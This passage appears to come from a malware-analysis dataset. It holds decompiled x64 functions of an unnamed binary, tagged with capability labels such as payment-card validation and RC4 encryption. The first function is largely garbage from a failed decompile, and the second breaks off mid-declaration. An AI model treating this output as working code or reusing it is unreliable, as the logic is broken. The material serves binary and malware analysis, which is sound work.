0xffffffff;\n            bVar45 = uVar14 != uVar14;\ncode_r0x0001400fd979:\n            puVar16 = puVar42;\n            if (bVar45 || bVar47) goto code_r0x0001400fd97b;\ncode_r0x0001400fd9e3:\n            arg1 = *(puStack104 + 0x73);\n            if (bVar47) goto code_r0x0001400fda5a;\n            unaff_RDI = puStack104 + 1;\n            uVar3 = in(uVar28);\n            *puStack104 = uVar3;\n            goto code_r0x0001400fd9e2;\n        }\n        puVar42 = arg3 + 0x61;\n        bVar45 = CARRY1(*puVar42, uVar26);\n        uVar31 = *puVar42;\n        *puVar42 = *puVar42 + uVar26;\n        bVar47 = *puVar42 == 0;\n        bVar46 = (POPCOUNT(*puVar42) & 1U) == 0;\n        if (bVar45) {\n            arg1 = *(unaff_RDI + 0x73);\n            if ((bVar47) || (bVar45 = *(unaff_RSI + 0x68) * 0x73613a3a != *(unaff_RSI + 0x68) * 0x73613a3a,  !bVar45))\n            goto code_r0x0001400fd90f;\n            puVar41 = puVar16;\n            puVar16 = puVar16 & 0xffffffff00000000 | ZEXT48(puVar41 + 1);\n            out(*puVar41, uVar28);\n            puVar42 = arg3 + 0x61;\n            bVar45 = CARRY1(*puVar42, uVar26);\n            *puVar42 = *puVar42 + uVar26;\n            bVar47 = *puVar42 == 0;\n            if (bVar45) {\n                uVar12 = *(unaff_RDI + 0x73);\n                goto code_r0x0001400fd8b0;\n            }\ncode_r0x0001400fd916:\n            if (!bVar45) {\n                *0x140394f01 = *0x140394f01 & uVar26;\n                goto code_r0x0001400fd987;\n            }\n            arg1 = *(puStack104 + 0x73);\n            if (!bVar47) {\n                bVar45 = *(puVar16 + 0x67) * 0x61623a3a != *(puVar16 + 0x67) * 0x61623a3a;\n                goto code_r0x0001400fd924;\n            }\n            goto code_r0x0001400fd98f;\n        }\ncode_r0x0001400fd901:\n        puVar16 = unaff_RSI + 1;\n        bVar48 = SCARRY1(uVar31, uVar26);\n        if (bVar45) {\n            arg1 = *(puStack104 + 0x73);\n            if (bVar47) goto code_r0x0001400fd97a;\n            bVar45 = *(unaff_RSI + 0x68) * 0x65723a3a != *(unaff_RSI + 0x68) * 0x65723a3a;\ncode_r0x0001400fd90f:\n            if (!bVar45) goto code_r0x0001400fd97a;\n            if (bVar46) {\n                *(puStack104 + 0x1a) = *(puStack104 + 0x1a) - uVar23;\n                goto code_r0x0001400fd97b;\n            }\n            puVar42 = arg3 + 0x61;\n            bVar45 = CARRY1(*puVar42, uVar26);\n            *puVar42 = *puVar42 + uVar26;\n            bVar47 = *puVar42 == 0;\n            goto code_r0x0001400fd916;\n        }\n        *(ppuVar33 + -8) = 0x3e2d7369;\n        if (bVar45) {\n            if (bVar46) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + 0x29;\ncode_r0x0001400fd977:\n            bVar45 = false;\n            *puVar15 = *puVar15 & 0xd7;\n            bVar47 = *puVar15 == 0;\n            puVar42 = puVar16;\n            goto code_r0x0001400fd979;\n        }\ncode_r0x0001400fd9dc:\n        if (!bVar48) {\n            puVar42 = arg3 + 0x61;\n            uVar23 = *puVar42;\n            *puVar42 = *puVar42 + uVar26;\n            bVar47 = *puVar42 == 0;\n            if (!CARRY1(uVar23, uVar26)) {\n                return;\n            }\n            goto code_r0x0001400fd9e3;\n        }\ncode_r0x0001400fda5a:\n        if (!bVar47) {\n            bVar45 = *(puVar16 + 0x67) * 0x65723a3a != *(puVar16 + 0x67) * 0x65723a3a;\n            puVar42 = puVar16;\n            unaff_RDI = puStack104;\n            goto joined_r0x0001400fda63;\n        }\ncode_r0x0001400fdace:\n        uVar2 = in(uVar28);\n        *puStack104 = uVar2;\n        puVar42 = puVar16;\ncode_r0x0001400fdacf:\n        iVar5 = *(puVar15 * 2 + 0x62) * 0x63697361;\n        bVar45 = iVar5 != iVar5;\n        if (bVar45) {\n            if (!bVar45) {\n                out(*puVar42, uVar28);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x0001400fdb45;\n        }\ncode_r0x0001400fdb4e:\n        *puVar15 = *puVar15 + puVar15;\n    }\n    else {\n        if (0x6968741f < uVar43) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar16 = unaff_RSI;\n        if ((POPCOUNT(uVar43 + 0x96978be0 & 0xff) & 1U) == 0) {\n            puVar42 = arg3 + in_GS_OFFSET + 0x61;\n            bVar45 = CARRY1(*puVar42, uVar26);\n            *puVar42 = *puVar42 + uVar26;\n            bVar47 = *puVar42 == 0;\n            if (bVar45) {\n                arg1 = *(unaff_RDI + 0x73);\n                goto code_r0x0001400fd868;\n            }\n            ppuVar33 = &puStack104;\n            puStack104 = arg1;\ncode_r0x0001400fd8d0:\n            unaff_RDI = *ppuVar33;\n            puVar36 = ppuVar33 + 1;\n            ppuVar34 = ppuVar33 + 1;\n            unaff_RBP = *(unaff_RDI + 0x6e);\n            puVar8 = ppuVar33 + 1;\n            if (!bVar45) goto code_r0x0001400fd94a;\n            if (!bVar45) {\n                puVar16 = *(uVar14 + 0x1400fd76e);\n                goto code_r0x0001400fd8dc;\n            }\ncode_r0x0001400fd94d:\n            *puVar15 = *puVar15 + puVar15;\n            uVar31 = puVar15 >> 8;\n            bVar45 = CARRY1(*0x19f3013c8, uVar31);\n            bVar47 = SCARRY1(*0x19f3013c8, uVar31);\n            *0x19f3013c8 = *0x19f3013c8 + uVar31;\n            puStack104 = *puVar36;\n            ppuVar33 = puVar36 + 1;\n            if (bVar47) {\n                return;\n            }\n            if (!bVar45) {\ncode_r0x0001400fd97a:\n                *(ppuVar33 + -8) = 0x20686369;\n                *puVar15 = *puVar15 + puVar15;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(puStack104 + 0x1a) = *(puStack104 + 0x1a) - uVar23;\n            goto code_r0x0001400fd95d;\n        }\n        *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + 0x29;\n        *puVar15 = *puVar15 & 0xd7;\n        bVar47 = *puVar15 == 0;\n        if (bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x0001400fd868:\n        if (bVar47) {\ncode_r0x0001400fd8dc:\n            puVar8 = ppuVar34;\n            if (!bVar47) {\ncode_r0x0001400fd94a:\n                puVar36 = puVar8;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                puVar15 = uVar43 & 0x5f203a73;\n                goto code_r0x0001400fd94d;\n            }\n            puStack104 = unaff_RDI + 1;\n            uVar2 = in(uVar28);\n            *unaff_RDI = uVar2;\n            puVar42 = puVar16 + 0x6f;\n            bVar45 = false;\n            *puVar42 = *puVar42 & 0xd7;\n            bVar47 = *puVar42 == 0;\n        }\n        else {\n            uVar4 = *(unaff_RSI + 0x67) * 0x4d5f3a3a;\n            unaff_RBP = uVar4 & 0xffffffff;\n            bVar45 = uVar4 != uVar4;\n            ppuVar33 = auStack96;\n            ppuVar34 = auStack96;\n            if (bVar45) {\n                if (bVar47) {\n                    out(*unaff_RSI, uVar28);\n                    puVar16 = arg3 + in_FS_OFFSET + 0x61;\n                    bVar45 = CARRY1(*puVar16, uVar26);\n                    uVar31 = *puVar16;\n                    *puVar16 = *puVar16 + uVar26;\n                    bVar47 = *puVar16 == 0;\n                    bVar46 = (POPCOUNT(*puVar16) & 1U) == 0;\n                    goto code_r0x0001400fd901;\n                }\n                puVar16 = unaff_RSI + 1;\n                out(*unaff_RSI, uVar28);\n                unaff_RDI = puStack104;\n                goto code_r0x0001400fd8dc;\n            }\n            ppuVar34 = auStack96;\n            if (!bVar45) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        if (bVar47) {\n            puStack104 = *ppuVar34;\n            ppuVar33 = ppuVar34 + 1;\n            puVar42 = puVar16;\n            if (bVar45) goto code_r0x0001400fd907;\ncode_r0x0001400fd97b:\n            ppuVar33 = arg1[0x1a] * 0x20736920;\n            puVar15 = uVar43 & 0x29757a;\ncode_r0x0001400fd987:\n            puVar42 = arg3 + 0x61;\n            uVar23 = *puVar42;\n            uVar31 = puVar15 >> 8;\n            *puVar42 = *puVar42 + uVar31;\n            bVar47 = *puVar42 == 0;\n            if (!CARRY1(uVar23, uVar31)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            arg1 = *(puStack104 + 0x73);\ncode_r0x0001400fd98f:\n            if (bVar47) {\n                *ppuVar33 = arg1;\n                return;\n            }\ncode_r0x0001400fd991:\n            puStack104 = *(ppuVar33 + 8);\ncode_r0x0001400fd99c:\n            out(*puVar16, uVar28);\n            puVar16 = puVar16 + 1;\n        }\n        else {\n            if (bVar45 || bVar47) {\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                puVar36 = ppuVar34;\n                goto code_r0x0001400fd94d;\n            }\n            uVar2 = in(uVar28);\n            *puStack104 = uVar2;\n            uVar4 = *(puVar15 + uVar14 + 0x1400fd762) * 0x63697361;\n            bVar45 = uVar4 == uVar4;\n            puStack104 = *(uVar4 & 0xffffffff);\n            ppuVar33 = (uVar4 & 0xffffffff) + 1;\n            if (bVar45) {\n                if (bVar47) {\n                    *puVar16 = *puVar16 & arg1 >> 8;\n                    puVar42 = uVar14 + 0x1400fd769 + unaff_RBP * 2;\n                    *puVar42 = *puVar42 & uVar23;\n                    goto code_r0x0001400fd95d;\n                }\n                goto code_r0x0001400fd991;\n            }\n            if (bVar45) {\n                out(*puVar16, uVar28);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x0001400fd95d:\n            puVar15 = puVar15 & 0x2029757a;\n            puVar15[unaff_RBP * 2 + 0x69] = puVar15[unaff_RBP * 2 + 0x69] & uVar23;\n        }\ncode_r0x0001400fd99d:\n        *puVar15 = *puVar15 & 0xd7;\n        unaff_RDI = puStack104;\n        if (*puVar15 != 0) {\n            return;\n        }\ncode_r0x0001400fd9a1:\n        puVar35 = arg1[0x1a] * 0x20736920;\n        uVar12 = puVar15 & 0x2029757a;\n        puVar15 = uVar12;\n        if (0x6968741f < uVar12) {\ncode_r0x0001400fd9e2:\n            puVar35 = *(arg1 + 0x5f) * 0x69727473;\n            puVar42 = puVar16 + 1;\n            out(*puVar16, uVar28);\n            uVar23 = arg1 >> 8;\n            bVar45 = uVar23 < *iVar13;\n            if (SBORROW1(uVar23, *iVar13)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (bVar45) {\n                if (!bVar45) goto code_r0x0001400fdacf;\n                if (!bVar45) {\n                    out(*puVar42, uVar28);\n                    bVar45 = SBORROW1(uVar23, *iVar13);\n                    puVar42 = puVar16 + 2;\n                    if (*iVar13 <= uVar23) goto joined_r0x0001400fda63;\n                    out(puVar16[2], uVar28);\n                    puVar42 = puVar16 + 7;\n                    out(*(puVar16 + 3), uVar28);\n                }\ncode_r0x0001400fdac6:\n                puStack104 = unaff_RDI + 1;\n                uVar2 = in(uVar28);\n                *unaff_RDI = uVar2;\n                puVar1 = puVar42 + 0x6f;\n                *puVar1 = *puVar1 & 0xd7;\n                if (*puVar1 == 0) {\n                    puVar16 = arg3 + 0x61;\n                    uVar23 = puVar15 >> 8;\n                    bVar45 = CARRY1(*puVar16, uVar23);\n                    *puVar16 = *puVar16 + uVar23;\n                    uVar23 = *puVar16;\n                    goto code_r0x0001400fdaef;\n                }\n                puVar16 = puVar42;\n                if (*puVar1 != 0) goto code_r0x0001400fdace;\ncode_r0x0001400fdb2f:\n                *puVar15 = *puVar15 + cVar10;\n                *puVar15 = *puVar15 + puVar15;\n                *puVar15 = *puVar15 + puVar15;\n                goto code_r0x0001400fdb35;\n            }\n            puVar1 = arg3 + 0x61;\n            uVar23 = *puVar1;\n            uVar31 = puVar15 >> 8;\n            bVar45 = SCARRY1(*puVar1, uVar31);\n            *puVar1 = *puVar1 + uVar31;\n            bVar47 = *puVar1 == 0;\n            if (CARRY1(uVar23, uVar31)) {\n                if (!bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                if ((bVar47) || (*(puVar16 + 0x68) * 0x73613a3a == *(puVar16 + 0x68) * 0x73613a3a)) {\ncode_r0x0001400fdae4:\n                    puVar16 = puVar42;\n                    uVar23 = *(unaff_RDI + 0x73) >> 8;\n                    if (bVar47) {\n                        cVar9 = puVar15;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar16 = *puVar16 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar16 = *puVar16 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *arg3 = *arg3;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *arg3 = *arg3;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *puVar15 = *puVar15 + cVar9;\n                        *(puVar15 * 2) = *(puVar15 * 2);\n                        goto code_r0x0001400fdb92;\n                    }\n                    goto code_r0x0001400fdaf7;\n                }\n                puVar16 = puVar42 & 0xffffffff00000000 | ZEXT48(puVar42 + 1);\n                out(*puVar42, uVar28);\n                puVar42 = arg3 + 0x61;\n                uVar23 = *puVar42;\n                *puVar42 = *puVar42 + uVar31;\n                if (CARRY1(uVar23, uVar31)) {\n                    arg1 = *(unaff_RDI + 0x73);\n                    uVar23 = arg1 >> 8;\n                    if (*puVar42 != 0) {\n                        bVar46 = *(puVar16 + 0x67) * 0x70613a3a != *(puVar16 + 0x67) * 0x70613a3a;\n                        bVar47 = bVar46;\n                        goto code_r0x0001400fda8e;\n                    }\n                    goto code_r0x0001400fdaf7;\n                }\n                puVar16 = iVar13 + 0x61;\n                bVar45 = CARRY1(*puVar16, uVar31);\n                *puVar16 = *puVar16 + uVar31;\n                uVar23 = *puVar16;\ncode_r0x0001400fdaef:\n                if (bVar45) {\n                    if (uVar23 != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                goto code_r0x0001400fdb5a;\n            }\njoined_r0x0001400fda63:\n            if (!bVar45) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            puVar16 = arg3 + 0x61;\n            uVar23 = *puVar16;\n            uVar31 = puVar15 >> 8;\n            *puVar16 = *puVar16 + uVar31;\n            bVar47 = *puVar16 == 0;\n            if (CARRY1(uVar23, uVar31)) {\n                if ((!bVar47) && (*(puVar42 + 0x67) * 0x61623a3a != *(puVar42 + 0x67) * 0x61623a3a))\n                goto code_r0x0001400fdae4;\n                goto code_r0x0001400fdb4d;\n            }\n        }\n        else {\n            if (0x6968741f < uVar12) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if ((POPCOUNT(uVar12 + 0x96978be0 & 0xff) & 1U) == 0) {\n                puVar42 = arg3 + in_GS_OFFSET + 0x61;\n                uVar26 = puVar15 >> 8;\n                bVar46 = CARRY1(*puVar42, uVar26);\n                uVar31 = *puVar42;\n                *puVar42 = *puVar42 + uVar26;\n                bVar45 = *puVar42 == 0;\n                uVar23 = *puVar42;\n                bVar47 = SCARRY1(uVar31, uVar26);\n                if (bVar46) {\n                    arg1 = *(unaff_RDI + 0x73);\n                    goto code_r0x0001400fda28;\n                }\ncode_r0x0001400fda8e:\n                uVar23 = arg1 >> 8;\n                if (bVar47) {\n                    if (bVar46) {\n                        return;\n                    }\ncode_r0x0001400fdaf7:\n                    out(*puVar16, uVar28);\n                    if (uVar23 < *iVar13) {\n                        return;\n                    }\n                    uVar23 = puVar15;\n                    *puVar15 = *puVar15 + uVar23;\n                    *puVar15 = *puVar15 + uVar23;\n                    *puVar15 = *puVar15 + uVar23;\n                    *puVar15 = *puVar15 | uVar23;\n                    *puVar15 = *puVar15 + uVar23;\n                    *puVar15 = *puVar15 + uVar23;\n                    *puVar15 = *puVar15 + uVar23;\n                    uVar23 = uVar23 | *puVar15;\n                    puVar16 = puVar15 & 0xffffffffffffff00 | uVar23;\n                    *puVar16 = *puVar16 + uVar23;\n                    *puVar16 = *puVar16 + uVar23;\n                    *puVar16 = *puVar16 + uVar23;\n                    uVar23 = uVar23 | *puVar16;\n                    puVar15 = puVar15 & 0xffffffffffffff00 | uVar23;\n                    *puVar15 = *puVar15 + uVar23;\n                    *puVar15 = *puVar15 + uVar23;\n                    *puVar15 = *puVar15 + uVar23;\ncode_r0x0001400fdb92:\n                    cVar9 = puVar15;\n                    *puVar15 = *puVar15 + cVar9;\n                    *puVar15 = *puVar15 + cVar9;\n                    *puVar15 = *puVar15 + cVar9;\n                    *puVar15 = *puVar15 + cVar9;\n                    *puVar15 = *puVar15 + cVar9;\n                    *puVar15 = *puVar15 + cVar9;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar42 = puVar16 + 1;\n                out(*puVar16, uVar28);\n                puVar16 = arg3 + in_FS_OFFSET + 0x61;\n                uVar23 = *puVar16;\n                uVar31 = puVar15 >> 8;\n                *puVar16 = *puVar16 + uVar31;\n                bVar47 = (POPCOUNT(*puVar16) & 1U) == 0;\n                if (CARRY1(uVar23, uVar31)) {\n                    if (*puVar16 == 0) goto code_r0x0001400fdb0e;\n                    goto code_r0x0001400fda9c;\n                }\n                *puVar15 = *puVar15 + puVar15;\n                *puVar15 = *puVar15 + puVar15;\ncode_r0x0001400fdb06:\n                *puVar15 = *puVar15 + puVar15;\ncode_r0x0001400fdb08:\n                *puVar15 = *puVar15 + puVar15;\n                *puVar15 = *puVar15 + puVar15;\ncode_r0x0001400fdb0c:\n                *puVar15 = *puVar15 + puVar15;\ncode_r0x0001400fdb0e:\n                *puVar15 = *puVar15 + puVar15;\n                *(puVar35 + -8) = puVar15;\n                *(puVar35 + -0x10) = in_R11;\ncode_r0x0001400fdb15:\n                cVar9 = puVar15;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\ncode_r0x0001400fdb23:\n                cVar9 = puVar15;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                *puVar15 = *puVar15 + cVar9;\n                goto code_r0x0001400fdb2f;\n            }\n            *0x1400fd700 = *0x1400fd700 & 0xffffff00 | *0x1400fd700 + 0x29;\n            puVar42 = puVar16;\ncode_r0x0001400fd9bc:\n            *puVar15 = *puVar15 & 0xd7;\n            bVar45 = *puVar15 == 0;\n            uVar23 = *puVar15;\n            puVar16 = puVar42;\n            if (bVar45) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x0001400fda28:\n            bVar47 = (POPCOUNT(uVar23) & 1U) == 0;\n            puVar42 = puVar16;\n            if (!bVar45) {\n                bVar45 = *(puVar16 + 0x67) * 0x4d5f3a3a != *(puVar16 + 0x67) * 0x4d5f3a3a;\n                puVar37 = puVar35 + 1;\n                puVar38 = puVar35 + 1;\n                puVar39 = puVar35 + 1;\n                if (bVar45) {\n                    if (bVar45) {\n                        puVar35 = puVar35 + 1;\n                        if (bVar45) goto code_r0x0001400fdb06;\n                        puVar42 = puVar16 + 1;\n                        out(*puVar16, uVar28);\n                        uVar23 = arg1 >> 8;\n                        bVar45 = uVar23 < *iVar13;\n                        bVar47 = (POPCOUNT(uVar23 - *iVar13) & 1U) == 0;\n                        puVar35 = puVar38;\n                        puVar40 = puVar37;\n                        if (bVar45) goto code_r0x0001400fdb08;\n                        goto code_r0x0001400fdaa3;\n                    }\n                    puVar15[0x4f] = puVar15[0x4f] + cVar10;\n                    *puVar35 = arg1;\n                }\n                else {\n                    if (!bVar45) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    puVar35 = puVar35 + 1;\n                    puVar40 = puVar39;\n                    if (bVar45) goto code_r0x0001400fdaa5;\n                }\n                goto code_r0x0001400fdb0e;\n            }\ncode_r0x0001400fda9c:\n            bVar45 = *(puVar42 + 0x67) * 0x65723a3a != *(puVar42 + 0x67) * 0x65723a3a;\n            puVar40 = puVar35;\ncode_r0x0001400fdaa3:\n            puVar35 = puVar40;\n            puVar40 = puVar35;\n            if (!bVar45) goto code_r0x0001400fdb0e;\ncode_r0x0001400fdaa5:\n            puVar35 = puVar40;\n            if (bVar47) goto code_r0x0001400fdb0c;\n            puVar16 = arg3 + 0x61;\n            uVar23 = *puVar16;\n            uVar31 = puVar15 >> 8;\n            *puVar16 = *puVar16 + uVar31;\n            if (!CARRY1(uVar23, uVar31)) goto code_r0x0001400fdb15;\n            if (*puVar16 == 0) goto code_r0x0001400fdb23;\n            iVar5 = *(puVar42 + 0x67) * 0x535f3a3a;\n            bVar45 = iVar5 == iVar5;\n            unaff_RDI = *puVar40;\n            if (bVar45) {\ncode_r0x0001400fdb32:\n                uVar31 = puVar15;\n                *puVar15 = *puVar15 + uVar31;\n                *puVar15 = *puVar15 + uVar31;\n                uVar23 = *puVar15;\n                *puVar15 = *puVar15 + uVar31;\n                *puVar15 = *puVar15 + uVar31 + CARRY1(uVar23, uVar31);\n                *puVar15 = *puVar15 + uVar31;\n                *puVar15 = *puVar15 + uVar31;\n                *puVar15 = *puVar15 + uVar31;\n                uVar31 = uVar31 + *puVar15;\n                pcVar17 = puVar15 & 0xffffffffffffff00 | uVar31;\n                *pcVar17 = *pcVar17 + uVar31;\n                *pcVar17 = *pcVar17 + uVar31;\n                *pcVar17 = *pcVar17 + uVar31;\n                uVar31 = uVar31 + *pcVar17;\n                puVar15 = puVar15 & 0xffffffffffffff00 | uVar31;\n                *puVar15 = *puVar15 + uVar31;\n                *puVar15 = *puVar15 + uVar31;\n                goto code_r0x0001400fdb4e;\n            }\n            if (bVar45) {\n                puVar42 = *(puVar15 + 0x6e);\n                if (*puVar16 == 0) goto code_r0x0001400fdac6;\n                goto code_r0x0001400fdb32;\n            }\ncode_r0x0001400fdb35:\n            cVar9 = puVar15;\n            *puVar15 = *puVar15 + cVar9;\n            *puVar15 = *puVar15 + cVar10;\n            *puVar15 = *puVar15 + cVar9;\n            *puVar15 = *puVar15 + cVar9;\n            *puVar15 = *puVar15 + cVar9;\n        }\n        cVar9 = puVar15;\n        *arg3 = *arg3 + cVar9;\n        *puVar15 = *puVar15 + cVar9;\n        *puVar15 = *puVar15 + cVar9;\ncode_r0x0001400fdb45:\n        cVar9 = puVar15;\n        *puVar15 = *puVar15 + cVar9;\n        *arg3 = *arg3 + cVar9;\n        *puVar15 = *puVar15 + cVar9;\n        *puVar15 = *puVar15 + cVar9;\n    }\ncode_r0x0001400fdb4d:\n    cVar9 = puVar15;\n    *puVar15 = *puVar15 + cVar9;\n    *(puVar15 * 2) = *(puVar15 * 2) + cVar9;\n    *puVar15 = *puVar15 + cVar9;\n    *puVar15 = *puVar15 + cVar9;\n    *puVar15 = *puVar15 + cVar9;\ncode_r0x0001400fdb5a:\n    cVar9 = puVar15;\n    *puVar15 = *puVar15 + cVar9;\n    *puVar15 = *puVar15 + cVar9;\n    *puVar15 = *puVar15 + cVar9;\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 21154
    },
    "14007dcf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0001401046b1) overlaps instruction at (ram,0x0001401046b0)\n// \n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.14007dcf0(int64_t **arg1, ulong noname_1, int64_t *arg3)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    uint64_t uVar32;\n    int64_t **ppiVar33;\n    int64_t **ppiVar34;\n    int64_t **ppiVar35;\n    int64_t **ppiVar36;\n    int64_t **ppiVar37;\n    int64_t **ppiVar38;\n    int64_t **ppiVar39;\n    char cVar40;\n    uint8_t uVar41;\n    uint8_t uVar42;\n    uint8_t uVar43;\n    ushort uVar44;\n    uint16_t uVar45;\n    int16_t iVar46;\n    int16_t iVar47;\n    uint16_t uVar48;\n    int32_t iVar49;\n    uint32_t uVar50;\n    uint32_t uVar51;\n    int64_t **ppiVar52;\n    uint16_t *puVar53;\n    char *pcVar54;\n    int16_t *piVar55;\n    int64_t iVar56;\n    ulong uVar57;\n    int64_t iVar58;\n    uint64_t uVar59;\n    uint32_t *puVar60;\n    uint32_t *puVar62;\n    uint8_t uVar64;\n    char *pcVar63;\n    int64_t **ppiVar65;\n    int32_t iVar66;\n    int16_t *piVar67;\n    uint64_t uVar68;\n    int64_t *piVar69;\n    int64_t *piVar70;\n    uchar *puVar71;\n    int64_t **unaff_RBX;\n    int64_t **ppiVar72;\n    int64_t **ppiVar73;\n    int64_t **ppiVar74;\n    int64_t **ppiVar75;\n    int64_t **ppiVar76;\n    bool bVar77;\n    uint8_t uVar78;\n    char cVar79;\n    int64_t *piVar80;\n    int64_t *unaff_RBP;\n    bool bVar81;\n    int64_t **unaff_RSI;\n    uint8_t *puVar82;\n    int64_t **unaff_RDI;\n    int64_t **ppiVar83;\n    int64_t **in_R9;\n    int64_t **unaff_R12;\n    int64_t **unaff_R13;\n    int64_t **unaff_R14;\n    int64_t *piVar84;\n    uchar *puVar85;\n    int64_t *unaff_R15;\n    ushort in_FS;\n    int64_t in_FS_OFFSET;\n    bool bVar86;\n    uchar auVar87 [16];\n    uint in_XMM1_Da;\n    uint in_XMM1_Db;\n    uint in_XMM1_Dc;\n    uint in_XMM1_Dd;\n    uint in_XMM3_Da;\n    uint in_XMM3_Db;\n    uint in_XMM3_Dc;\n    uint in_XMM3_Dd;\n    uint in_XMM4_Da;\n    uint in_XMM4_Db;\n    uint in_XMM4_Dc;\n    uint in_XMM4_Dd;\n    uint in_XMM5_Da;\n    uint in_XMM5_Db;\n    uint in_XMM5_Dc;\n    uint in_XMM5_Dd;\n    uint in_XMM6_Da;\n    uint in_XMM6_Db;\n    uint in_XMM6_Dc;\n    uint in_XMM6_Dd;\n    int64_t **in_stack_00000000;\n    uint8_t auStackX8 [8];\n    uint *puStackX16;\n    ulong *puStackX32;\n    uchar (*in_stack_00000028) [16];\n    uchar *in_stack_00000030;\n    int16_t in_stack_00000038;\n    unkbyte6 in_stack_0000003a;\n    uchar uStack0000000000000040;\n    unkbyte5 Stack0000000000000040;\n    uint8_t uStack0000000000000045;\n    char cStack0000000000000046;\n    uint32_t uStack0000000000000044;\n    int64_t **in_stack_00000040;\n    uint32_t in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000054;\n    int64_t **in_stack_00000058;\n    int16_t iStack0000000000000060;\n    int64_t *in_stack_00000060;\n    ushort in_stack_00000068;\n    unkbyte6 in_stack_0000006a;\n    uint in_stack_00000070;\n    int64_t *in_stack_00000078;\n    uint64_t in_stack_00000080;\n    uchar in_stack_00000088;\n    unkbyte7 in_stack_00000089;\n    int64_t **in_stack_000000c8;\n    int64_t **in_stack_000000e8;\n    uint32_t *in_stack_00000110;\n    ulong in_stack_00000118;\n    ulong in_stack_00000220;\n    uint32_t in_stack_00000230;\n    int64_t iStack112;\n    int64_t *piStack104;\n    uchar auStack96 [24];\n    int64_t *piStack56;\n    ushort uStack48;\n    int16_t iStack46;\n    int32_t iStack44;\n    uchar UNRECOVERED_JUMPTABLE [16];\n    int64_t *piStack24;\n    int64_t *piStack16;\n    int32_t *piVar61;\n    \n    ppiVar76 = &piStack104;\n    ppiVar74 = &piStack104;\n    ppiVar72 = &piStack104;\n    ppiVar75 = &piStack104;\n    piVar84 = *in_R9;\n    piVar80 = in_R9[1];\n    ppiVar83 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n    auVar87 = *in_stack_00000028;\n    uVar57 = SUB168(auVar87, 0);\n    ppiVar65 = 